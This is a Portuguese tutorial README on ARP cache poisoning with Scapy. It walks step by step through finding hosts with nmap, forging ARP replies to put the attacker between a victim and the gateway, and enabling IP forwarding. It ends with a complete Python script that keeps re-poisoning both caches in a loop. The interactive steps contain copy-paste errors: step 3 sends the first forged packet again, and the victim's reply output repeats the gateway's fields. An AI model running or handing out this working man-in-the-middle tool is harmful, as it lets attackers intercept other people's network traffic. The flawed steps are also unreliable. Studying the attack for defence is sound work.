# Arp Cache Poisoning

![](https://i.imgur.com/YEPsm6o.png)


## Objetivo
O objetivo desse ataque é "envenenar" a arp cache, tanto da vítima quanto do gateway padrão (dentro de uma rede), escrevendo informações falsas nelas e fazendo com que o atacante finja ser o gateway para a vítima e vice-versa. O atacante então encaminha os dados para os devidos endereços, tornando uma comunicação completa, porém tudo passa por ele.

## Fundamentação Teórica

Para ver a explicação detalhada do ataque clique [aqui](https://github.com/guilhermehiromoto/arp-cache-poisoning/blob/master/arp%20cache%20poisoning.pdf)

## Scapy

Scapy é uma ferramenta que permite ao usuário enviar, sniffar, dissecar e forjar pacotes.

> ### Instalação

Para assegurar estar usando a versão mais recente:

```bash
$ git clone https://github.com/secdev/scapy.git
$ cd scapy
$ sudo python3 setup.py install
```
ou
```bash
$ sudo apt install python3-scapy
```

## O ataque

- Passo 0: Identificar hosts (vítimas) na rede
```bash
$ sudo nmap 192.168.1.0/24 -sC
```

Supondo que eu tenha achado o host `192.168.1.101`

- Iniciando o Scapy
```
$ scapy

>>>
```
- 1º passo: Identificar o MAC Address da vítima e do default gateway
- Solução: arp request e arp reply
- Default gateway:

```python
>>> arprequest1 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst = "192.168.1.1")
>>> arprequest1.show()
###[ Ethernet ]### 
  dst= ff:ff:ff:ff:ff:ff
  src= 28:56:5a:49:ff:67
  type= ARP
###[ ARP ]### 
     hwtype= 0x1
     ptype= IPv4
     hwlen= None
     plen= None
     op= who-has
     hwsrc= 28:56:5a:49:ff:67
     psrc= 192.168.1.103
     hwdst= 00:00:00:00:00:00
     pdst= 192.168.1.1

>>> arpreply1 = srp(arprequest1)
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
>>> arpreply1[0][0][1]
(<<Ether  dst=28:56:5a:49:ff:67 src=c4:e9:84:9a:14:16 type=ARP |<ARP
hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=c4:e9:84:9a:14:16
psrc=192.168.1.1 hwdst=28:56:5a:49:ff:67 pdst=192.168.1.103 |>>)
```

Observe que o arp request faz um broadcast (`dst=ff:ff:ff:ff:ff:ff:ff`), carrega a operação 1 (`who-has`), com o hwdst (MAC address de destino) desconhecido e o `pdst` (IP de destino ) `192.168.1` . Ou seja, quando enviado com o `srp` pergunta à todos qual é o MAC do `192.168.1.1` e aguarda uma resposta.

O gateway recebe essa request e envia uma reply que chega como retorno do `srp` (arpreply1). É possível perceber que o `arpreply1` carrega a operação 2 (is-at) e tem como `hwsrc` (MAC Address de onde saiu) `c4:e9:84:9a:14:16`, que é justamente o MAC do gateway que queríamos.

- Vítima:

```python
>>> arprequest2 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst = "192.168.1.101")
>>> arprequest2.show()
###[ Ethernet ]### 
  dst= ff:ff:ff:ff:ff:ff
  src= 28:56:5a:49:ff:67
  type= ARP
###[ ARP ]### 
     hwtype= 0x1
     ptype= IPv4
     hwlen= None
     plen= None
     op= who-has
     hwsrc= 28:56:5a:49:ff:67
     psrc= 192.168.1.103
     hwdst= 00:00:00:00:00:00
     pdst= 192.168.1.101

>>> arpreply2 = srp(arprequest2)
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
>>> arpreply2[0][0][1]
(<<Ether  dst=28:56:5a:49:ff:67 src=c4:e9:84:9a:14:16 type=ARP |<ARP
hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=b4:2e:99:f4:b7:df
psrc=192.168.1.1 hwdst=28:56:5a:49:ff:67 pdst=192.168.1.103 |>>)
```
A mesma observação feita para o gateway vale para a vítima.

- 2º passo: “envenenar” o arp cache da vítima na linha do default gateway, preenchendo com o MAC address do atacante
- Solução: fake arp reply

```python
>>> arppoison1 = ARP(op = 2, psrc = "192.168.1.1", pdst = "192.168.1.101", hwdst = "b4:2e:99:f4:b7:df")
>>> arppoison1.show()
###[ ARP ]### 
  hwtype= 0x1
  ptype= IPv4
  hwlen= None
  plen= None
  op= is-at
  hwsrc= 28:56:5a:49:ff:67
  psrc= 192.168.1.1
  hwdst= b4:2e:99:f4:b7:df
  pdst= 192.168.1.101

>>> send(arppoison1)
.
Sent 1 packets.
```

Observe que o que está sendo enviado para a vítima (`192.168.1.101` no MAC `b4:2e:99:f4:b7:df`) é que o IP `192.168.1.1` (default gateway) está (`is-at`) no MAC `28:56:5a:49:ff:67` (`hwsrc`) que na verdade é o MAC do atacante.


- 3º passo: “envenenar” o arp cache do default gateway na linha da vítima, preenchendo com o MAC address do atacante
- Solução: fake arp reply

```python
>>> arppoison2 = ARP(op = 2, psrc = "192.168.1.101", pdst = "192.168.1.1", hwdst = "c4:e9:84:9a:14:16")
>>> arppoison1.show()
###[ ARP ]### 
  hwtype= 0x1
  ptype= IPv4
  hwlen= None
  plen= None
  op= is-at
  hwsrc= 28:56:5a:49:ff:67
  psrc= 192.168.1.101
  hwdst= c4:e9:84:9a:14:16
  pdst= 192.168.1.1

>>> send(arppoison1)
.
Sent 1 packets.
```

Observe agora que o que está sendo enviado para o gateway (`192.168.1.1` no MAC `c4:e9:84:9a:14:16`) é que o IP `192.168.1.101` (vítima) está (`is-at`) no MAC `28:56:5a:49:ff:67` (`hwsrc`) que na verdade é o MAC do atacante.

A partir desse momento, o gateway acha que a vítima está no MAC do atacante assim como a vítima acha que o gateway está no mesmo MAC malicioso.

# Problemas

Porém, só com isso, esse ataque ainda não é efetivo por 2 motivos:

1. Os pacotes saem do gateway e chegam no atacante, mas não vão até a vítima, assim como saem da vítima e chegam no atacante, mas não vão pro gateway. É preciso fazer com que o atacante encaminhe os pacotes para o iP certo quando passam por ele.

2. A arp cache possui um tempo de verificação de linhas obsoletas, fazendo novos arp requests para atualizá-la. Após o ataque ser feito uma vez, depois de um curto período de tempo, a cache voltaria ao normal.

# Soluções

1. Para encaminhar pacotes para os devidos IP's exitem 2 maneiras:

Pelo próprio kernel
```bash
$ echo 1 > /proc/sys/net/ipv4/ip_forward
```
ou

Utilizando o iptables
```bash
sudo apt install iptables
```

2. Para burlar o refresh da arp cache, o atacante pode enviar continuamente fake replys para sempre que um request for feito, já haja um fakereply pronto para responder. E isso pode ser feito com um [script](https://github.com/guilhermehiromoto/arp-cache-poisoning/blob/master/arp.py) em python.

```python
from scapy.all import *
import time

def getmac(targetip):
    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
    targetmac = srp(arppacket)[0][0][1].hwsrc
    return targetmac

def poisonarpcache(targetip, targetmac, sourceip):
    spoofed = ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
    send(spoofed)

def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet = ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
    send(packet)
    print ("ARP Table restored to normal for", targetip)

def main():
    targetip = input("Enter Target IP:")
    gatewayip = input("Enter Gateway IP:")
    
    try:
        targetmac = getmac(targetip)
    except:
         print("Target machine did not respond to ARP broadcast")
         quit()
    
    try:
        gatewaymac= getmac(gatewayip)
    except:
         print("Gateway is unreachable")
         quit()
    
    try:
        print ("Sending spoofed ARP replies")
        while True:
            time.sleep(5) 
            poisonarpcache(targetip, targetmac, gatewayip)
            poisonarpcache(gatewayip, gatewaymac, targetip)

    except KeyboardInterrupt:
        print ("ARP spoofing stopped")
        restorearp(gatewayip, gatewaymac, targetip, targetmac)
        restorearp(targetip, targetmac, gatewayip, gatewaymac)
        quit()

if __name__=="__main__":
    main()
```

# Referências
1. [RFC 826](https://web.archive.org/web/20041204044506/http://www.ietf.org/rfc/rfc826.txt)
2. [ARP Cache Poisoning using Scapy](https://medium.com/datadriveninvestor/arp-cache-poisoning-using-scapy-d6711ecbe112)
3. [Scapy Documentation](https://scapy.readthedocs.io/en/latest/usage.html)
